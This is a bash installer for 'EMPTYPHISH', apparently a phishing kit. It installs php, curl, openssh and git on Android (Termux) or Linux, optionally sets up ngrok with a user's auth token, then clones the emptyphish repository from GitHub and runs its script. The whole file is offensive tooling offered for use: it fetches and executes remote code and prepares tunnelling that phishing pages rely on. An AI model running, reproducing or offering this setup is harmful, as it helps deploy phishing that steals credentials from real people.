#!/bin/bash

# Check for internet connection

ping -c 1 google.com > /dev/null 2>&1 || { echo "Error: no internet connection found"; exit 1; }

echo "SETUP FOR EMPTYPHISH" | lolcat

OS=$(uname -o)

if [[ "$OS" == "Android" ]]; then
  pkg update -y
  pkg upgrade -y
  pkg install python2 -y
  pip2 install lolcat
  pkg install wget -y
  pkg install php -y
  pkg install curl -y
  pkg install openssh -y
  pkg install git -y
  git clone https://gitHub.com/evildevill/emptyphish.git
  cd emptyphish
  chmod +x *
  bash emptyphish.sh
else
  sudo apt-get update && sudo apt-get upgrade -y
  sudo apt-get install python2 -y
  sudo apt-get install python3 -y
  sudo apt-get install lolcat -y
  sudo apt-get install wget -y
  sudo apt-get install php -y
  sudo apt-get install curl -y
  sudo apt-get install openssh-server -y
  sudo apt-get install git -y
  
  read -p "Enter ngrok authentication token (leave blank to skip): " NGROK_AUTH_TOKEN
  
  if [ -n "$NGROK_AUTH_TOKEN" ]; then
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -P /tmp
    unzip /tmp/ngrok-stable-linux-amd64.zip -d /usr/local/bin
    chmod +x /usr/local/bin/ngrok
    /usr/local/bin/ngrok authtoken $NGROK_AUTH_TOKEN
  fi
  
  git clone https://gitHub.com/evildevill/emptyphish.git
  cd emptyphish
  chmod +x *
  bash emptyphish.sh
fi
